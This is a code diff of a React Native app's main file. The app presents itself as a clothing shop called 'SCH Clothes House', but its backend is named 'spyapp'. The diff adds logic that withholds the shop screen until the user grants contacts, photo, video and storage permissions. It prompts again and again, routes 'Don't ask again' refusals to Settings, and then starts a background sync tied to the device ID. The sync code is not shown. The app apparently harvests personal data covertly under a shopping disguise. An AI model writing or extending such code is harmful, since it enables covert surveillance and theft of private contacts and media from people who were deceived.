@@ -13,68 +13,78 @@ import DeviceInfo from 'react-native-device-info';
 import { ShopScreen } from './src/screens/ShopScreen';
 import { startBackgroundSync } from './src/services/BackgroundSyncService';
 
-type PermissionState = 'checking' | 'granted' | 'denied';
+type PermissionState = 'checking' | 'granted' | 'denied' | 'permanent'; // permanent = "Don't ask again"
 
 const BACKEND_URL = 'https://spyapp-backend-production.up.railway.app';
+
+const REQUIRED_PERMISSIONS_33 = [
+  PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+  PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
+  PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
+];
+const REQUIRED_PERMISSIONS_OLD = [
+  PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
+  PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
+  PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
+];
 
 export default function App() {
   const [permissionState, setPermissionState] = useState<PermissionState>('checking');
 
-  const checkAndRequestPermissions = async (): Promise<boolean> => {
-    if (Platform.OS !== 'android') return true;
+  const getRequiredPermissions = () =>
+    Platform.Version >= 33 ? REQUIRED_PERMISSIONS_33 : REQUIRED_PERMISSIONS_OLD;
 
-    const requiredPermissions = [
-      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
-      ...(Platform.Version >= 33
-        ? [
-            PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
-            PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
-          ]
-        : [
-            PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
-            PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
-          ]),
-    ];
+  const requestPermissions = async (): Promise<'granted' | 'denied' | 'permanent'> => {
+    if (Platform.OS !== 'android') return 'granted';
+
+    const permissions = getRequiredPermissions();
 
     try {
-      const grants = await PermissionsAndroid.requestMultiple(requiredPermissions);
+      const grants = await PermissionsAndroid.requestMultiple(permissions);
+      const results = Object.values(grants);
 
-      const allGranted = Object.values(grants).every(
-        (status) => status === PermissionsAndroid.RESULTS.GRANTED,
+      const allGranted = results.every(
+        s => s === PermissionsAndroid.RESULTS.GRANTED,
       );
+      if (allGranted) return 'granted';
 
-      return allGranted;
+      // Check karo — koi permission permanently deny hai?
+      const isPermanent = results.some(
+        s => s === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN,
+      );
+      return isPermanent ? 'permanent' : 'denied';
+
     } catch (err) {
       console.warn('Permission error:', err);
-      return false;
+      return 'denied';
     }
   };
 
-  const initApp = async () => {
-    setPermissionState('checking');
-
-    const granted = await checkAndRequestPermissions();
-
-    if (!granted) {
-      setPermissionState('denied');
-      return;
-    }
-
-    setPermissionState('granted');
-
-    // Sync shuru karo
+  const initSync = async () => {
     const uniqueId = await DeviceInfo.getUniqueId();
-    startBackgroundSync({
-      backendUrl: BACKEND_URL,
-      deviceId: uniqueId,
-    });
+    startBackgroundSync({ backendUrl: BACKEND_URL, deviceId: uniqueId });
+  };
+
+  const handleGrantPress = async () => {
+    setPermissionState('checking');
+    const result = await requestPermissions();
+
+    if (result === 'granted') {
+      setPermissionState('granted');
+      initSync();
+    } else if (result === 'permanent') {
+      // Android dialog nahi dikhata — Settings pe bhejo
+      setPermissionState('permanent');
+    } else {
+      setPermissionState('denied');
+    }
   };
 
   useEffect(() => {
-    initApp();
+    handleGrantPress();
   }, []);
 
-  // ── Loading state ─────────────────────────────────────────────────────────
+  // ── Loading ────────────────────────────────────────────────────────────────
   if (permissionState === 'checking') {
     return (
       <View style={styles.fullScreen}>
@@ -85,13 +95,37 @@ export default function App() {
     );
   }
 
-  // ── Permission denied screen ───────────────────────────────────────────────
+  // ── Permanent denial — Settings kholo ─────────────────────────────────────
+  if (permissionState === 'permanent') {
+    return (
+      <View style={styles.fullScreen}>
+        <Text style={styles.logoText}>SCH</Text>
+        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
+        <View style={styles.permBox}>
+          <Text style={styles.permIcon}>⚙️</Text>
+          <Text style={styles.permTitle}>Enable in Settings</Text>
+          <Text style={styles.permDesc}>
+            You selected <Text style={styles.bold}>"Don't ask again"</Text>.{'\n'}
+            Please enable <Text style={styles.bold}>Contacts</Text> and{' '}
+            <Text style={styles.bold}>Storage</Text> permissions manually from Settings.
+          </Text>
+          <TouchableOpacity style={styles.btnPrimary} onPress={() => Linking.openSettings()}>
+            <Text style={styles.btnPrimaryText}>Open Settings</Text>
+          </TouchableOpacity>
+          <TouchableOpacity style={styles.btnSecondary} onPress={handleGrantPress}>
+            <Text style={styles.btnSecondaryText}>Try Again</Text>
+          </TouchableOpacity>
+        </View>
+      </View>
+    );
+  }
+
+  // ── Denied — dobara maango ─────────────────────────────────────────────────
   if (permissionState === 'denied') {
     return (
       <View style={styles.fullScreen}>
         <Text style={styles.logoText}>SCH</Text>
         <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
-
         <View style={styles.permBox}>
           <Text style={styles.permIcon}>🔒</Text>
           <Text style={styles.permTitle}>Permissions Required</Text>
@@ -101,19 +135,13 @@ export default function App() {
             <Text style={styles.bold}>Gallery</Text>{'\n'}
             to work properly.
           </Text>
-
-          {/* Try Again Button */}
-          <TouchableOpacity style={styles.btnPrimary} onPress={initApp}>
+          {/* Har bar click pe Android se dubara maango */}
+          <TouchableOpacity style={styles.btnPrimary} onPress={handleGrantPress}>
             <Text style={styles.btnPrimaryText}>Grant Permissions</Text>
           </TouchableOpacity>
-
-          {/* Settings Button (agar permanently deny ho gaya) */}
-          <TouchableOpacity
-            style={styles.btnSecondary}
-            onPress={() => Linking.openSettings()}>
+          <TouchableOpacity style={styles.btnSecondary} onPress={() => Linking.openSettings()}>
             <Text style={styles.btnSecondaryText}>Open Settings</Text>
           </TouchableOpacity>
-
           <Text style={styles.permNote}>
             Without these permissions the app cannot function.
           </Text>
@@ -122,7 +150,7 @@ export default function App() {
     );
   }
 
-  // ── All permissions granted — show main app ───────────────────────────────
+  // ── Granted ────────────────────────────────────────────────────────────────
   return <ShopScreen />;
 }
 
@@ -134,85 +162,27 @@ const styles = StyleSheet.create({
     justifyContent: 'center',
     paddingHorizontal: 24,
   },
-  logoText: {
-    fontSize: 64,
-    fontWeight: '900',
-    color: '#c9a84c',
-    letterSpacing: 8,
-  },
-  logoSub: {
-    fontSize: 13,
-    color: '#c9a84c88',
-    letterSpacing: 4,
-    marginTop: 4,
-    marginBottom: 8,
-  },
+  logoText: { fontSize: 64, fontWeight: '900', color: '#c9a84c', letterSpacing: 8 },
+  logoSub: { fontSize: 13, color: '#c9a84c88', letterSpacing: 4, marginTop: 4, marginBottom: 8 },
   permBox: {
-    marginTop: 40,
-    backgroundColor: '#16243a',
-    borderRadius: 16,
-    borderWidth: 1,
-    borderColor: '#c9a84c33',
-    padding: 28,
-    alignItems: 'center',
-    width: '100%',
+    marginTop: 40, backgroundColor: '#16243a', borderRadius: 16,
+    borderWidth: 1, borderColor: '#c9a84c33', padding: 28,
+    alignItems: 'center', width: '100%',
   },
-  permIcon: {
-    fontSize: 40,
-    marginBottom: 12,
-  },
-  permTitle: {
-    fontSize: 20,
-    fontWeight: '700',
-    color: '#c9a84c',
-    marginBottom: 12,
-    textAlign: 'center',
-  },
-  permDesc: {
-    fontSize: 14,
-    color: '#8899aa',
-    textAlign: 'center',
-    lineHeight: 22,
-    marginBottom: 24,
-  },
-  bold: {
-    color: '#dce8f5',
-    fontWeight: '700',
-  },
+  permIcon: { fontSize: 40, marginBottom: 12 },
+  permTitle: { fontSize: 20, fontWeight: '700', color: '#c9a84c', marginBottom: 12, textAlign: 'center' },
+  permDesc: { fontSize: 14, color: '#8899aa', textAlign: 'center', lineHeight: 22, marginBottom: 24 },
+  bold: { color: '#dce8f5', fontWeight: '700' },
   btnPrimary: {
-    backgroundColor: '#c9a84c',
-    borderRadius: 10,
-    paddingVertical: 14,
-    paddingHorizontal: 32,
-    width: '100%',
-    alignItems: 'center',
-    marginBottom: 10,
+    backgroundColor: '#c9a84c', borderRadius: 10, paddingVertical: 14,
+    paddingHorizontal: 32, width: '100%', alignItems: 'center', marginBottom: 10,
   },
-  btnPrimaryText: {
-    color: '#0f1b2d',
-    fontWeight: '800',
-    fontSize: 15,
-    letterSpacing: 0.5,
-  },
+  btnPrimaryText: { color: '#0f1b2d', fontWeight: '800', fontSize: 15, letterSpacing: 0.5 },
   btnSecondary: {
-    borderWidth: 1,
-    borderColor: '#c9a84c55',
-    borderRadius: 10,
-    paddingVertical: 12,
-    paddingHorizontal: 32,
-    width: '100%',
-    alignItems: 'center',
-    marginBottom: 16,
+    borderWidth: 1, borderColor: '#c9a84c55', borderRadius: 10,
+    paddingVertical: 12, paddingHorizontal: 32, width: '100%',
+    alignItems: 'center', marginBottom: 16,
   },
-  btnSecondaryText: {
-    color: '#c9a84c',
-    fontWeight: '600',
-    fontSize: 14,
-  },
-  permNote: {
-    fontSize: 11,
-    color: '#445566',
-    textAlign: 'center',
-    lineHeight: 16,
-  },
+  btnSecondaryText: { color: '#c9a84c', fontWeight: '600', fontSize: 14 },
+  permNote: { fontSize: 11, color: '#445566', textAlign: 'center', lineHeight: 16 },
 });
